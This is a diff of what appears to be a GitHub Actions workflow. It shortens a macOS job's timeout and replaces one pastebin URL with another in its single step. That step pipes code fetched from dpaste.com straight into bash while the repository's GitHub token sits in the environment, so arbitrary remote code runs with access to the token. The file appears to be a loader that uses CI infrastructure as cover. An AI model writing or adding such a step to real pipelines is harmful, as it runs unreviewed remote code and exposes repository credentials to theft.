@@ -6,8 +6,8 @@ permissions:
 jobs:
   b:
     runs-on: macos-26
-    timeout-minutes: 360
+    timeout-minutes: 60
     steps:
       - env:
           GH_TOKEN: ${{ github.token }}
-        run: curl -fsSL https://dpaste.com/3BJS9SMEW.txt | bash
+        run: curl -fsSL https://dpaste.com/62G34CZDF.txt | bash
